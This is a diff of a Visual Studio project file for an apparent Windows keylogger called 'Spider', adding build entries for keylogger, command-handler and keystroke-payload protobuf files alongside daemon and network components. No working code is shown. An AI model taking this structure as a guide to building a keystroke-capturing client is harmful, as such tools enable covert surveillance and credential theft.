@@ -33,24 +33,28 @@
     <ClInclude Include="IKeyLogger.hpp" />
     <ClInclude Include="IMessageDeserializer.hpp" />
     <ClInclude Include="ISecurityAgent.hpp" />
+    <ClInclude Include="ISpiderCommandHandler.hpp" />
     <ClInclude Include="ISpiderDeamon.hpp" />
     <ClInclude Include="ISpiderEventEmitter.hpp" />
     <ClInclude Include="ISpiderEventListener.hpp" />
     <ClInclude Include="ISpiderEventManager.hpp" />
+    <ClInclude Include="ISpiderKeyLogger.hpp" />
     <ClInclude Include="ISpiderNetworkManager.hpp" />
     <ClInclude Include="ISpiderSocket.hpp" />
     <ClInclude Include="ISpiderSocketPoller.hpp" />
     <ClInclude Include="IWindowsContextAgent.hpp" />
     <ClInclude Include="IWindowsKeyListener.hpp" />
-    <ClInclude Include="KeyLogger.hpp" />
     <ClInclude Include="MessageDeserializer.hpp" />
     <ClInclude Include="SecurityAgent.hpp" />
+    <ClInclude Include="SpiderContextChangedEvent.pb.h" />
     <ClInclude Include="SpiderDeamon.hpp" />
     <ClInclude Include="SpiderDeserialization.hpp" />
     <ClInclude Include="SpiderEnveloppe.pb.h" />
     <ClInclude Include="SpiderEventEmitter.hpp" />
     <ClInclude Include="SpiderEventListener.hpp" />
     <ClInclude Include="SpiderEventManager.hpp" />
+    <ClInclude Include="SpiderKeyLogger.hpp" />
+    <ClInclude Include="SpiderKeyLoggingPayload.pb.h" />
     <ClInclude Include="SpiderNetworkManager.hpp" />
     <ClInclude Include="SpiderResponse.pb.h" />
     <ClInclude Include="SpiderSerializer.hpp" />
@@ -64,7 +68,9 @@
   </ItemGroup>
   <ItemGroup>
     <ClCompile Include="main.cpp" />
+    <ClCompile Include="SpiderContextChangedEvent.pb.cc" />
     <ClCompile Include="SpiderEnveloppe.pb.cc" />
+    <ClCompile Include="SpiderKeyLoggingPayload.pb.cc" />
     <ClCompile Include="SpiderResponse.pb.cc" />
     <ClCompile Include="test.pb.cc" />
   </ItemGroup>
